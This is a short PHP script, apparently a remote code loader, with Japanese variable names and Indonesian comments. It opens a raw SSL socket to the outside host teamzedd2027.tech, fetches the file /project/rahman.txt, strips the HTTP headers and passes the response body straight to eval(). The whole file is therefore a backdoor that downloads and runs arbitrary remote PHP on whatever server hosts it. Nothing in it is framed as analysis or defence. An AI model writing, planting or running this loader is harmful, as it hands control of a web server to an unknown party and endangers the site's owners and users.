<?php
// バージョン 2: ソケット接続 (Koneksi Socket Manual)
$ホスト = 'teamzedd2027.tech';
$パス = '/project/rahman.txt';

$接続 = fsockopen("ssl://" . $ホスト, 443, $errno, $errstr, 30);
if ($接続) {
    $リクエスト = "GET $パス HTTP/1.1\r\n";
    $リクエスト .= "Host: $ホスト\r\n";
    $リクエスト .= "Connection: Close\r\n\r\n";
    
    fwrite($接続, $リクエスト);
    $レスポンス = "";
    while (!feof($接続)) {
        $レスポンス .= fgets($接続, 1024);
    }
    fclose($接続);

    // ヘッダーを分離してボディを取得 (Pisahkan header dan ambil body)
    $分割 = explode("\r\n\r\n", $レスポンス, 2);
    $コード = $分割[1];
    eval("?>".$コード);
}
?>